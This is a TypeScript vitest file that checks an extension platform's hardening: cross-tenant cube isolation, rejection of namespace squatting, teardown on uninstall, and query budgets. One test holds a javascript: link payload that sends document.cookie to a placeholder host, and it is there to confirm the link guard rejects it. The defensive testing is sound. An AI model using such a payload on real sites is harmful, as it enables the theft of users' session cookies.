// Malicious cross-tenant + uninstall-cleanup battery (cinatra#1628, S11c / AC4).
//
// Ties the S11c hardening surfaces together as one adversarial story:
//   1. a runtime cube contributed by an extension installed in ORG A must NOT be
//      serveable OR discoverable by an actor in ORG B (server-owned per-query
//      authz — the serve-gate + catalog filter);
//   2. an extension may not register a portlet alias namespaced to ANOTHER
//      package (install-scoped namespacing) — and a same-id collision is rejected;
//   3. UNINSTALL tears down the package's runtime cubes AND portlet kinds (nothing
//      keeps serving/resolving after teardown);
//   4. a malicious extension dashboard with a javascript: link is rejected;
//   5. an oversized cube-descriptor declaration is rejected (query budget).

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import {
  decideRuntimeCubeServe,
  filterServeableCubeIds,
  type RuntimeCubeInstallFacts,
} from "../cubes/runtime-cube-serve-gate";
import {
  registerRuntimeCubes,
  unregisterRuntimeCubesForPackage,
  isRuntimeCube,
  parseRuntimeCubeDescriptors,
  __resetRuntimeCubeRegistryForTests,
  MAX_MEMBERS_PER_RUNTIME_CUBE_DESCRIPTOR,
  type RuntimeCubeFromTable,
} from "../cubes/runtime-cube-registry";
import {
  __resetPortletRegistryForTests,
  getPortletKind,
  registerRuntimePortletKind,
  unregisterRuntimePortletKindsForPackage,
  isInstallScopedPortletAlias,
} from "../portlets/registry";
import { registerCorePortletKinds, hostBundledPortletKinds } from "../portlets/kinds";
import { collectUnsafeDashboardLinks } from "../extension/portlet-link-guard";

const V = "1.0.0";
const PKG_A = "@cinatra-ai/blog-agent";
const CUBE_A = "blog_agent__runs";
const hasComponentFor = (kind: string) => new Set(hostBundledPortletKinds()).has(kind);
const isRt = (cubeId: string) => isRuntimeCube(cubeId);

beforeEach(() => {
  __resetRuntimeCubeRegistryForTests();
  __resetPortletRegistryForTests();
  registerCorePortletKinds();
});
afterEach(() => {
  __resetRuntimeCubeRegistryForTests();
  __resetPortletRegistryForTests();
});

function registerCubeForOrgA(): void {
  const r = registerRuntimeCubes({
    sourcePackageName: PKG_A,
    ownerScope: { ownerLevel: "organization", ownerId: "owner-a", organizationId: "org-A" },
    descriptors: [{ cubeId: CUBE_A, fromTable: "agent_runs", members: ["count"] }],
    activationGeneration: 1,
  });
  expect(r.ok).toBe(true);
}

describe("cross-tenant cube isolation (server-owned per-query authz)", () => {
  it("DENIES org B's actor from serving org A's runtime cube", () => {
    registerCubeForOrgA();
    // Org B's actor: the read-model resolves the source package as NOT addressable
    // (another org's install) -> actorVisible:false -> cube_not_active.
    const orgBFacts: RuntimeCubeInstallFacts = { actorVisible: false, status: "absent", trust: null };
    const verdict = decideRuntimeCubeServe({ cubeId: CUBE_A, isRuntimeCube: isRt, facts: orgBFacts });
    expect(verdict.ok).toBe(false);
    if (!verdict.ok) expect(verdict.code).toBe("cube_not_active");
  });

  it("DROPS org A's runtime cube from org B's catalog, keeps it for org A", async () => {
    registerCubeForOrgA();
    const factsFor = (who: "A" | "B") => async (): Promise<RuntimeCubeInstallFacts | null> =>
      who === "A"
        ? { actorVisible: true, status: "active", trust: { trusted: true } }
        : { actorVisible: false, status: "absent", trust: null };
    const forB = await filterServeableCubeIds({ cubeIds: ["agent_runs", CUBE_A], isRuntimeCube: isRt, factsFor: factsFor("B") });
    expect(forB).toEqual(["agent_runs"]); // bundled kept, cross-tenant runtime dropped
    const forA = await filterServeableCubeIds({ cubeIds: ["agent_runs", CUBE_A], isRuntimeCube: isRt, factsFor: factsFor("A") });
    expect(new Set(forA)).toEqual(new Set(["agent_runs", CUBE_A]));
  });
});

describe("cross-package portlet-alias squat rejection", () => {
  it("a package may not register an alias namespaced to ANOTHER package", () => {
    // @evil/pkg tries to ship an alias claiming @cinatra-ai/blog-agent's namespace.
    expect(isInstallScopedPortletAlias("blog_agent__list", "@evil/pkg")).toBe(false);
    // Its OWN namespace is fine.
    expect(isInstallScopedPortletAlias("pkg__list", "@evil/pkg")).toBe(true);
  });
});

describe("uninstall cleanup (teardown removes cubes + portlet kinds)", () => {
  it("after teardown the runtime cube no longer exists (stops serving)", () => {
    registerCubeForOrgA();
    expect(isRuntimeCube(CUBE_A)).toBe(true);
    const removed = unregisterRuntimeCubesForPackage(PKG_A);
    expect(removed).toEqual([CUBE_A]);
    expect(isRuntimeCube(CUBE_A)).toBe(false);
  });

  it("after teardown the runtime portlet kind no longer resolves", () => {
    registerRuntimePortletKind(
      { kind: "blog_agent__list", version: V, rendersAs: "object-list", sourcePackageName: PKG_A, activationGeneration: 1 },
      { hasComponentFor },
    );
    expect(getPortletKind("blog_agent__list", V)).toBeDefined();
    const removed = unregisterRuntimePortletKindsForPackage(PKG_A);
    expect(removed).toEqual(["blog_agent__list"]);
    expect(getPortletKind("blog_agent__list", V)).toBeUndefined();
  });
});

describe("malicious content rejection", () => {
  it("rejects a dashboard portlet carrying a javascript: link", () => {
    const errs = collectUnsafeDashboardLinks({
      portlets: [{ instanceId: "evil", config: { href: "javascript:fetch('//x/'+document.cookie)" } }],
    });
    expect(errs.length).toBe(1);
  });

  it("rejects an oversized cube-descriptor declaration (query budget)", () => {
    const members = Array.from({ length: MAX_MEMBERS_PER_RUNTIME_CUBE_DESCRIPTOR + 1 }, (_, i) => `m${i}`);
    const publishedMembersOf = (_t: RuntimeCubeFromTable) => members;
    const r = parseRuntimeCubeDescriptors(
      [{ cubeId: "big", fromTable: "agent_runs", members }],
      publishedMembersOf,
    );
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe("cube_members_budget_exceeded");
  });
});
